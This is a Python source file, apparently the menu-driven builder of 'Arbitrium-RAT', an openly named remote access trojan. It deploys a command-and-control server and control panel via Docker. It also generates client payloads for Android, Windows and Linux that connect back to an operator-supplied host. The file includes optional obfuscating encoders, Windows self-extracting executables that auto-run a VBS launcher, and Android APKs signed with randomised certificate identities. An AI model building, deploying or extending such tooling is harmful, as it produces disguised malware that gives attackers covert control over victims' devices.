# -*- coding: utf-8 -*-

from PyInquirer import prompt
import sys, json, os, socket
import random, commands
from menus import menus_dict, DomainValidator, PortValidator, directoryExist, fileExist


menu_manager = {'current_menu': '_'}
current_path = '/'.join(os.path.abspath(__file__).split('/')[:-1])
unavailable_features = ["_generateclients_android_binder_", "_generateclients_windows_native_", "_generateclients_linux_native_"]


def resetBanner(*args):
	os.system('reset')
	header_banner = '''

    _         _     _ _        _                   ____      _  _____ 
   / \   _ __| |__ (_) |_ _ __(_)_   _ _ __ ___   |  _ \    / \|_   _|
  / _ \ | '__| '_ \| | __| '__| | | | | '_ ` _ \  | |_) |  / _ \ | |  
 / ___ \| |  | |_) | | |_| |  | | |_| | | | | | | |  _ <  / ___ \| |  
/_/   \_\_|  |_.__/|_|\__|_|  |_|\__,_|_| |_| |_| |_| \_\/_/   \_\_|  
                                                                      
	\r\n\033[92m [!] version 1.0.0\033[0m, Hope you star the repo if you like it :)
	\r\n https://github.com/BenChaliah/Arbitrium-RAT\r\n
	'''

	print(header_banner)



def check_port(setp):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.bind(("0.0.0.0", setp))
	except socket.error as e:
		return 0
	s.close()
	return 1



def checkInstallationX():
	if os.geteuid():
		sys.exit("\n[-] Please run the script as root!\n")
	_ = commands.getoutput("docker images 2>&1 | grep arbitrium-rat")
	if not len(_):
		answers = prompt([{
        'type': 'confirm',
        'message': 'Do you want to start installation?',
        'name': 'setup',
        'default': False,
    	}])
		if answers['setup']:
			print("\r\033[92m [!] This may take a while\033[0m, grab some popcorn meanwhile :)\n")
			_ = os.system("{}/setup.sh".format(current_path))
		else:
			sys.exit(0)



def checkInstallation():
	if os.geteuid():
		sys.exit("\n[-] Please run the script as root!\n")
	_ = commands.getoutput("cat .env.conf")
	if "cat: .env.conf: No such file" in _:
		answers = prompt([{
        'type': 'confirm',
        'message': 'Do you want the full installation?',
        'name': 'setup',
        'default': False,
    	}])
		if answers['setup']:
			print("\r\033[92m [!] This may take a while\033[0m, grab some popcorn meanwhile :)\n")
			_ = os.system("{}/setup.sh {}/docker/full-image".format(*[current_path]*2))
		else:
			answers = prompt(menus_dict['docker'])
			adjust_f = "{}/docker/arbitrium-core ".format(current_path)
			adjust_f += " ".join(["{}/docker/{}-docker".format(current_path, i.lower()) for i in answers['docker_settings']])
			_ = os.system("cat {} > /tmp/arbitrium-docker \
				&& {}/setup.sh /tmp/arbitrium-docker".format(adjust_f, current_path))
		_ = commands.getoutput("touch {}/.env.conf".format(current_path))



def run_docker(params):
	docker_script = "/tmp/{}.sh".format(random.randint(10000, 99999))
	with open(docker_script, "w") as f:
		f.write("#!/bin/bash\n" + "\n".join(accu_settings['docker_run']))

	_ = commands.getoutput("docker rm arbitrium -f")
	if params['list_choice'] == 'deployserver':
		docker_sh = "docker run -itd -p {}:4321 -p {}:80 --name arbitrium benchaliah/arbitrium-rat && \
            docker cp {} arbitrium:/root/initArbitrium.sh && \
            docker exec -it arbitrium bash /root/initArbitrium.sh".format(params['webport'], params['lport'], docker_script)
	else:
		_ = commands.getoutput("rm -rf {}/output && mkdir {}/output".format(current_path, current_path))
		docker_sh = "docker run -itd --name arbitrium benchaliah/arbitrium-rat && \
            docker cp {} arbitrium:/root/initArbitrium.sh && \
            docker cp docker_assets/. arbitrium:/root/build_assets/ && \
            docker exec -it arbitrium bash /root/initArbitrium.sh && \
            docker cp arbitrium:/root/build_output/. {}/output/".format(docker_script, current_path)
	_ = os.system(docker_sh)



def apply_encoder(params, dest):

	map_encoders =  map(__import__, ['encoders.{}'.format(i) for i in os.listdir('encoders')\
	 if not os.path.isfile('encoders/{}'.format(i))])
	encoders_mods = [getattr(i, dir(i)[-1]) for i in map_encoders]
	choices_dict = {"{}: {}".format(i._encoder_name_, i._version_): i for i in encoders_mods\
	 if params['platform'] in i._platforms_}

	if not len(choices_dict.keys()):
		print("\r\n\033[93m No encoder is available for this platform.\033[0m\n")
		sys.exit(1)

	answers = prompt([{
		'type': 'list',
		'name': 'encoder',
		'message': 'Choose an encoder',
		'choices': choices_dict.keys()
	}])
	apply_enc = choices_dict[answers['encoder']].__name__.split('.')[1]

	exit_status = commands.getstatusoutput("cd {}/encoders/{} && cp {}.layout cryptFrame.layout.tmp &&\
		sed -i s/{{API_FQDN}}/{}/g cryptFrame.layout.tmp &&\
	 python encoder.py > {} &&\
	 rm cryptFrame.layout.tmp".format(current_path, apply_enc, params['platform'], params['fqdn'], dest))[0]
	if exit_status:
		print("\r\n\033[93m Failed to encrypt, please try again.\033[0m\n")
		sys.exit(1)



def _exit_(*args):
	os.system("rm -rf {}/docker_assets".format(current_path))
	print("Bye!")
	sys.exit(0)


def _cleanarbitriumsenviroment_(*args):
	answers = prompt([
		{
		'type': 'confirm',
		'message': 'This will remove the docker container but not the image, do you wish to continue?',
		'name': 'docker',
		'default': False,
		}
	])
	if answers['docker']:
		_ = commands.getoutput("docker rm arbitrium -f")
		print("\r\033[92m [!] the server container was removed successfully\033[0m\n")



def _fullreset_(*args):
	answers = prompt([
		{
		'type': 'confirm',
		'message': 'This will remove the docker image, do you wish to continue?',
		'name': 'docker',
		'default': False,
		}
	])
	if answers['docker']:
		_ = commands.getoutput("rm {}/.env.conf && docker rmi benchaliah/arbitrium-rat -f".format(current_path))
		print("\r\033[92m [!] the reset is finished, run main.py to start a new installation\033[0m\n")
		sys.exit(0)



def _generateclients_android_(params):

	accu_settings['docker_run'].append("cd /root/build_assets/apk_src/ && cordova build android --{}".format(params['list_choice']))

	if params['list_choice'] == 'release':
		sign_key = "jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /root/build_assets/my.keystore /root/build_assets/apk_src/platforms/android/app/build/outputs/apk/release/app-release-unsigned.apk {keyalias} -storepass {keypass} -keypass {keypass}"
		accu_settings['docker_run'].append(sign_key.format(**params))
		accu_settings['docker_run'].append("cd /root/build_assets/apk_src/platforms/android/app/build/outputs/apk/release/ && mv app-release-unsigned.apk app-release-signed.apk &&\
			mv /root/build_assets/my.keystore .")


	accu_settings['docker_run'].append("mkdir /root/build_output/ &&\
	 cp -r /root/build_assets/apk_src/platforms/android/app/build/outputs/apk/* /root/build_output/")
	run_docker(params)
	resetBanner()
	print("\r\n\033[92m [!] the APK should be available in {}/output/\n\033[0m\n\r".format(current_path))


def _generateclients_android_binder_(params):
	pass


def _generateclients_android_singleapk_(params):
	if len(params['src_location']):
		os.system('cd {} && zip -r {}/docker_assets/apk_src.zip * -q'.format(params['src_location'], current_path))
		accu_settings['docker_run'].append("unzip /root/build_assets/apk_src.zip -d /root/build_assets/apk_src/")
	else:
		accu_settings['docker_run'].append("git -C /root/build_assets/ clone https://github.com/BenChaliah/Arbitrium-Android &&\
		 mv /root/build_assets/Arbitrium-Android/Build_APK /root/build_assets/apk_src/")


def _generateclients_android___release_(params):
	gen_key = 'keytool -genkey -keyalg RSA -keysize 2048 -validity 10000 -noprompt -alias {keyalias} -dname "CN={rand_1}.{rand_2}.com, OU=ID, O={rand_3}, L={rand_4}, S={rand_5}, C=US" -keystore /root/build_assets/my.keystore -storepass {keypass} -keypass {keypass}'
	params.update({'rand_%d'%(i+1): ''.join([random.choice('abcdefghijklmnopqrstuvwxyz') for j in range(random.randint(2,6))]) for i in range(5)})
	accu_settings['docker_run'].append("cd /root/build_assets")
	accu_settings['docker_run'].append(gen_key.format(**params))




def _generateclients_windows_(params):
	if params['list_choice'] in ['exe', 'native']:

		accu_settings['docker_run'].append("mkdir /root/build_output/ &&\
		 cp -r /root/build_assets/dist/WinApp.exe /root/build_output/")
		run_docker(params)

	resetBanner()
	print("\r\n\033[92m [!] the client should be available in {}/output/\n\033[0m\n\r".format(current_path))




def _generateclients_windows__(params):
	get_str = lambda l: "".join([random.choice("abcdefghijklmnopqrstuvwxyz") for i in range(l)])
	singleFrame, start_script = get_str(random.randint(6,8)), get_str(random.randint(6,8))
	_ = commands.getoutput("rm -rf {}/output/Windows && mkdir -p {}/output/Windows".format(*[current_path]*2))
	params['lhost'] = '127.0.0.1' if not len(params['lhost']) else params['lhost']
	params['lport'] = '80' if not len(params['lport']) else params['lport']
	params['fqdn'] = "{}:{}".format(params['lhost'], params['lport']) if params['lport'] != '80' else params['lhost']
	params['platform'] = 'windows'
	if params['list_choice'] == 'exe':

		_ = commands.getoutput("cd " + current_path + " && cp layouts/Windows/* docker_assets/ &&\
			sed -i s/{{API_FQDN}}/{}/g docker_assets/singleFrame.py &&\
			mv docker_assets/singleFrame.py docker_assets/{}.py".format(params['fqdn'], singleFrame))

		if params['obfuscate']:
			apply_encoder(params, "{}/docker_assets/{}.py".format(current_path, singleFrame))

		accu_settings['docker_run'].append("cd /root/build_assets/ && apt-get install rar")
		accu_settings['docker_run'].append("wine /root/wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile {}.py".format(singleFrame))
		accu_settings['docker_run'].append("cp SFXAutoInstaller.conf dist && cp start_script.vbs dist && cd dist")
		accu_settings['docker_run'].append("sed -i s/singleFrame/{}/g start_script.vbs && mv start_script.vbs {}.vbs".format(singleFrame, start_script))
		accu_settings['docker_run'].append("sed -i s/start_script/{}/g SFXAutoInstaller.conf".format(start_script))
		accu_settings['docker_run'].append("rar a -r -cfg -sfxwindows.sfx -zSFXAutoInstaller.conf -XSFXAutoInstaller.conf WinApp.exe")

	elif params['list_choice'] == 'python':
		_ = commands.getoutput("cd " + current_path + " && cp layouts/Windows/singleFrame.py output/Windows/singleFrame.py &&\
			sed -i s/{{API_FQDN}}/{}/g output/Windows/singleFrame.py".format(params['fqdn']))
		if params['obfuscate']:
			apply_encoder(params, "{}/output/Windows/singleFrame.py".format(current_path))



def _generateclients_windows_native_(params):
	pass




def _generateclients_linux_(params):
	if params['list_choice'] in ['elf', 'native']:

		accu_settings['docker_run'].append("mkdir /root/build_output/ &&\
		 cp -r /root/build_assets/dist/LinApp /root/build_output/")
		run_docker(params)

	resetBanner()
	print("\r\n\033[92m [!] the client should be available in {}/output/\n\033[0m\n\r".format(current_path))




def _generateclients_linux__(params):
	get_str = lambda l: "".join([random.choice("abcdefghijklmnopqrstuvwxyz") for i in range(l)])
	singleFrame, start_script = get_str(random.randint(6,8)), get_str(random.randint(6,8))
	_ = commands.getoutput("rm -rf {}/output/Linux && mkdir -p {}/output/Linux".format(*[current_path]*2))
	params['lhost'] = '127.0.0.1' if not len(params['lhost']) else params['lhost']
	params['lport'] = '80' if not len(params['lport']) else params['lport']
	params['fqdn'] = "{}:{}".format(params['lhost'], params['lport']) if params['lport'] != '80' else params['lhost']
	params['platform'] = 'linux'

	if params['list_choice'] == 'elf':

		_ = commands.getoutput("cd " + current_path + " && cp layouts/Linux/* docker_assets/ &&\
			sed -i s/{{API_FQDN}}/{}/g docker_assets/singleFrame.py &&\
			mv docker_assets/singleFrame.py docker_assets/{}.py".format(params['fqdn'], singleFrame))

		accu_settings['docker_run'].append("cd /root/build_assets/")
		accu_settings['docker_run'].append("pyinstaller --onefile {}.py && cd dist && mv {} LinApp".format(*[singleFrame]*2))

		if params['obfuscate']:
			apply_encoder(params, "{}/docker_assets/{}.py".format(current_path, singleFrame))

	elif params['list_choice'] == 'python':
		_ = commands.getoutput("cd " + current_path + " && cp layouts/Linux/singleFrame.py output/Linux/singleFrame.py &&\
			sed -i s/{{API_FQDN}}/{}/g output/Linux/singleFrame.py".format(params['fqdn']))
		if params['obfuscate']:
			apply_encoder(params, "{}/output/Linux/singleFrame.py".format(current_path))



def _generateclients_linux_native_(params):
	pass



def _deployserver_(params):
	_ = commands.getoutput("docker rm arbitrium -f")
	params['lhost'] = '127.0.0.1' if not len(params['lhost']) else params['lhost']
	params['lport'] = '80' if not len(params['lport']) else params['lport']
	params['webport'] = '4321' if not len(params['webport']) else params['webport']
	if check_port(int(params['lport'])) and check_port(int(params['webport'])):
		accu_settings['docker_run'].append("cd /root/build_assets && git clone https://github.com/benchaliah/Arbitrium-RAT.git --recursive")
		accu_settings['docker_run'].append("cd Arbitrium-RAT && rm -rf WebApp && git clone https://github.com/benchaliah/Arbitrium-WebApp.git && mv Arbitrium-WebApp WebApp")
		accu_settings['docker_run'].append("cd /root/build_assets/Arbitrium-RAT/WebApp")
		accu_settings['docker_run'].append("./setAPI_FQDN.sh {}:{}".format(params['lhost'], params['lport']))
		accu_settings['docker_run'].append("cd /root/build_assets/Arbitrium-RAT")
		accu_settings['docker_run'].append("./setAPI_FQDN.sh " + params['lhost'])
		accu_settings['docker_run'].append("./ServerAPI/runserver.sh")
		accu_settings['docker_run'].append("cd WebApp && screen -S webapp -d -m bash -c \"npm run serve -- --port 4321\" -L -Logfile /root/screenLog")
		accu_settings['docker_run'].append("reset")
		run_docker(params)
		resetBanner()
		print("\033[92m [+] serverAPI: http://{}:{}\r\n[+] Control Panel: http://{}:{}\033[0m\r\n[!] the server will be available in few seconds, please hold...\n".format(params['lhost'],\
			params['lport'], params['lhost'], params['webport']))
	else:
		raw_input("[-] Choose available ports please, [Enter] to return the menu")






_generateclients_android_binder_release_ = _generateclients_android_singleapk_release_ = _generateclients_android___release_
_generateclients_windows_python_ = _generateclients_windows_exe_ = _generateclients_windows__
_generateclients_linux_python_ = _generateclients_linux_elf_ = _generateclients_linux__


checkInstallation()



accu_settings = {"docker_run": []}
os.system("rm -rf {}/docker_assets && mkdir {}/docker_assets".format(*[current_path]*2))


while True:
	resetBanner()

	if menu_manager['current_menu'] not in menus_dict.keys():
		for j in range(1, menu_manager['current_menu'].count('_')):
			func_name = "_{}_".format('_'.join(menu_manager['current_menu'].split('_')[1:-j]))
			if func_name in unavailable_features:
				print("\r\n\033[93m [-] Feature is not available yet, but working on it\033[0m\n")
				break
			elif func_name in globals().keys():
				globals()[func_name](accu_settings)
		menu_manager['current_menu'] = "_"
		accu_settings = {"docker_run": []}

	answers = prompt(menus_dict[menu_manager['current_menu']])
	menu_manager['current_menu'] += answers['list_choice'] + '_' if 'list_choice' in answers.keys() else '_'
	accu_settings.update(answers)



